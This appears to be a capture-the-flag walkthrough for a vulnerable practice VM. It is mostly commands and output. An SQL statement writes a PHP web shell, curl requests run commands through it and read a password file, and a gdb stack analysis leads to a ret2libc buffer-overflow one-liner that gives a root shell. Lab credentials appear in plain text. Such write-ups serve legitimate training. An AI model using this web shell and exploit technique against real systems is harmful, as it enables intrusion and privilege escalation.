## phpmyadmin
Login with `root/Fg-'kKXBj87E:aJ$`
```
SELECT "<?php if(isset($_GET['cmd'])){system($_GET['cmd']);}?>" INTO OUTFILE '/var/www/forum/templates_c/shell.php'

> curl -k 'https://$VMIP/forum/templates_c/shell.php?cmd=whoami'
www-data
> curl -k 'https://$VMIP/forum/templates_c/shell.php?cmd=find+/home+-user+www-data'
/home
/home/LOOKATME
/home/LOOKATME/password
> curl -k 'https://$VMIP/forum/templates_c/shell.php?cmd=cat+/home/LOOKATME/password'
lmezard:G!@M6f4Eatau{sF"
```

## FTP
Login with `lmezard:G!@M6f4Eatau{sF"`

```
> ftp lmezard@$VMIP
Connected to 192.168.57.2.
220 Welcome on this server
331 Please specify the password.
Password:
230 Login successful.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
226 Directory send OK.

> cat README
Complete this little challenge and use the result as password for user 'laurie' to login in ssh
```

```
> file fun
fun: POSIX tar archive (GNU)
> tar -xf fun
```

```
> printf 'Iheartpwnage' | shasum -a 256
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4  -
```

## ssh laurie

## ssh thor

## ssh zaz
```
zaz@BornToSecHackMe:~$ gdb -batch -ex "set disassembly-flavor intel" -ex "disassemble main" exploit_me
Dump of assembler code for function main:
   0x080483f4 <+0>:	push   ebp
   0x080483f5 <+1>:	mov    ebp,esp
   0x080483f7 <+3>:	and    esp,0xfffffff0
   0x080483fa <+6>:	sub    esp,0x90
   0x08048400 <+12>:	cmp    DWORD PTR [ebp+0x8],0x1
   0x08048404 <+16>:	jg     0x804840d <main+25>
   0x08048406 <+18>:	mov    eax,0x1
   0x0804840b <+23>:	jmp    0x8048436 <main+66>
   0x0804840d <+25>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048410 <+28>:	add    eax,0x4
   0x08048413 <+31>:	mov    eax,DWORD PTR [eax]
   0x08048415 <+33>:	mov    DWORD PTR [esp+0x4],eax
   0x08048419 <+37>:	lea    eax,[esp+0x10]
   0x0804841d <+41>:	mov    DWORD PTR [esp],eax
   0x08048420 <+44>:	call   0x8048300 <strcpy@plt>
   0x08048425 <+49>:	lea    eax,[esp+0x10]
   0x08048429 <+53>:	mov    DWORD PTR [esp],eax
   0x0804842c <+56>:	call   0x8048310 <puts@plt>
   0x08048431 <+61>:	mov    eax,0x0
   0x08048436 <+66>:	leave
   0x08048437 <+67>:	ret
End of assembler dump.
```

```
zaz@BornToSecHackMe:~$ gdb -q exploit_me
Reading symbols from /home/zaz/exploit_me...(no debugging symbols found)...done.
(gdb) break *0x08048420
Breakpoint 1 at 0x8048420
(gdb) run 42
Starting program: /home/zaz/exploit_me 42

Breakpoint 1, 0x08048420 in main ()
(gdb) info registers eax
eax            0xbffff6d0	-1073744176
(gdb) info frame
Stack level 0, frame at 0xbffff760:
 eip = 0x8048420 in main; saved eip 0xb7e454d3
 Arglist at 0xbffff758, args:
 Locals at 0xbffff758, Previous frame's sp is 0xbffff760
 Saved registers:
  ebp at 0xbffff758, eip at 0xbffff75c
(gdb) print 0xbffff75c - 0xbffff6d0
$1 = 140
```

```
zaz@BornToSecHackMe:~$ ./exploit_me `perl -e 'print "A"x140 . pack("V", 0xb7e6b060) . pack("V", 0xb7e5ebe0) . pack("V", 0xb7f8cc58)'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`�����X��
# whoami
root
```
